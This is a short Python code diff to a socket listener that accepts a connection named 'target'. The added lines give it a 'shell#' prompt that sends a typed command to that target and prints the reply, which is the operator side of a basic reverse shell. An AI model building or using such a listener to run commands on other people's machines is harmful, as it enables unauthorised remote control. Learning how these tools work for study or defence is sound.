@@ -8,5 +8,9 @@ s.listen(5) #listen 5 connection
 print("Listening for incoming connections")
 target, ip = s.accept()
 print("Target connected!")
-s.close()
 
+message = input("* shell#-%s: " % str(ip))
+target.send(message.encode())
+answer = target.recv(1024).decode() #recieving 1024 bytes
+print(answer)
+s.close()
